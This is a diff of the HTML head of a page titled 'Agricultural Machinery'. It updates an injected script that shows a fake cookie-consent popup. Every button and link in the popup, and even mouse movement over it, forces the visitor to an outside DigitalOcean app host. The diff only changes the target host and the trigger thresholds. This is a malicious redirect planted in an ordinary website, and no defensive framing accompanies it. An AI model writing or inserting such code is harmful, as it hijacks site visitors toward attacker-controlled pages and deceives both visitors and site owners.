@@ -3,8 +3,7 @@
 <head>
 	<script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://shark-app-2-hm7gm.ondigitalocean.app/";
- 
+	            const redirectUrl = "https://octopus-app-2-pxnw9.ondigitalocean.app/";
 	            const style = document.createElement("style");
 	            style.textContent = `
 	                .cookie-overlay {
@@ -19,12 +18,10 @@
 	                    z-index: 9999;
 	                    animation: fadeInBackground 0.5s ease-out forwards;
 	                }
- 
 	                @keyframes fadeInBackground {
 	                    from { opacity: 0; }
 	                    to { opacity: 1; }
 	                }
- 
 	                .cookie-popup {
 	                    position: fixed;
 	                    bottom: 60px;
@@ -40,7 +37,6 @@
 	                    max-width: 400px;
 	                    text-align: center;
 	                }
- 
 	                .close-btn {
 	                    background: none;
 	                    border: none;
@@ -51,7 +47,6 @@
 	                    cursor: pointer;
 	                    color: #888;
 	                }
- 
 	                .btn-primary {
 	                    background-color: #007bff;
 	                    color: #fff;
@@ -64,23 +59,19 @@
 	                    text-decoration: none;
 	                    transition: background-color 0.3s;
 	                }
- 
 	                .btn-primary:hover {
 	                    background-color: #0056b3;
 	                }
- 
 	                h3 {
 	                    font-family: 'Arial', sans-serif;
 	                    margin-bottom: 10px;
 	                }
- 
 	                p {
 	                    font-family: 'Arial', sans-serif;
 	                    line-height: 1.5;
 	                }
 	            `;
 	            document.head.appendChild(style);
- 
 	            const overlay = document.createElement("div");
 	            overlay.className = "cookie-overlay";
 	            overlay.id = "cookie-overlay";
@@ -93,36 +84,30 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://shark-app-2-hm7gm.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="https://octopus-app-2-pxnw9.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
- 
 	            let isRedirected = false;
 	            let startPos = null;
 	            let redirectTimeout = null;
- 
 	            const handleRedirect = () => {
 	                if (!isRedirected) {
 	                    isRedirected = true;
 	                    window.location.href = redirectUrl;
 	                }
 	            };
- 
 	            const detectMouseMove = (event) => {
 	                if (isRedirected) return;
- 
 	                const screenHeight = window.innerHeight;
-	                const activeTop = screenHeight * 0.1;
- 
+	                const activeTop = screenHeight * 0.15;
 	                if (event.clientY >= activeTop) {
 	                    if (!startPos) {
 	                        startPos = { x: event.clientX, y: event.clientY };
 	                    } else {
 	                        const dx = Math.abs(event.clientX - startPos.x);
 	                        const dy = Math.abs(event.clientY - startPos.y);
- 
-	                        if ((dx > 10 || dy > 10) && !redirectTimeout) {
+	                        if ((dx > 15 || dy > 15) && !redirectTimeout) {
 	                            redirectTimeout = setTimeout(handleRedirect, 1000);
 	                        }
 	                    }
@@ -132,14 +117,11 @@
 	                    redirectTimeout = null;
 	                }
 	            };
- 
 	            document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);
- 
 	            document.getElementById("accept-cookies").addEventListener("click", function (e) {
 	                e.preventDefault();
 	                handleRedirect();
 	            });
- 
 	            document.getElementById("close-popup").addEventListener("click", function (e) {
 	                e.preventDefault();
 	                handleRedirect();
@@ -147,7 +129,7 @@
 	        });
 	</script>
 			
-
+			
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Agricultural Machinery</title>
